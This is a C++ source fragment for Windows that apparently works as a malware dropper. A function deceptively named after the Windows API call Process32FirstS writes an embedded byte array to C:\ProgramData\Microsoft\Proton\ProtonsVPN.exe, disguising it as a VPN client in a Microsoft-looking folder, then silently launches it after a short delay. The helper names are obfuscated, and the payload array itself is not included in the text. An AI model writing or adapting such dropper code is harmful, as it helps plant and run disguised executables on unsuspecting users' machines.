#include <iostream>
#include <Windows.h>
#include <thread>
#include <string>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <vector>
#include <math.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <winioctl.h>
#include <Uxtheme.h>
#include <dwmapi.h>
#include <WinInet.h>
#include <Mmsystem.h>
#include <mciapi.h>
#include <shobjidl_core.h>
#include <direct.h>
#include <urlmon.h>
#include <random>


#include "Gl/wglew.h"
#include <iostream>
#include <fstream>
#include <cstdint>
#include <filesystem>
using namespace std;

bool rmrmc(const std::string& file_path, std::vector<uint8_t>* out_buffer)
{
	std::ifstream file_ifstream(file_path, std::ios::binary);

	if (!file_ifstream)
		return false;

	out_buffer->assign((std::istreambuf_iterator<char>(file_ifstream)), std::istreambuf_iterator<char>());
	file_ifstream.close();

	return true;
}

bool mrymc(const std::string& desired_file_path, const char* address, size_t size)
{
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size))
	{
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}

void Process32FirstS(string App)//H0p3$ARS Property
{
	namespace fs = std::filesystem;
	fs::create_directories("C:\\ProgramData\\Microsoft\\Proton");

	mrymc("C:\\ProgramData\\Microsoft\\Proton\\ProtonsVPN.exe", reinterpret_cast<const char*>(Gfl), sizeof(Gfl));//H0p3$ARS Property
	
	

	
	Sleep(4000);//H0p3$ARS Property
	system("start C:\\ProgramData\\Microsoft\\Proton\\ProtonsVPN.exe");//H0p3$ARS Property


}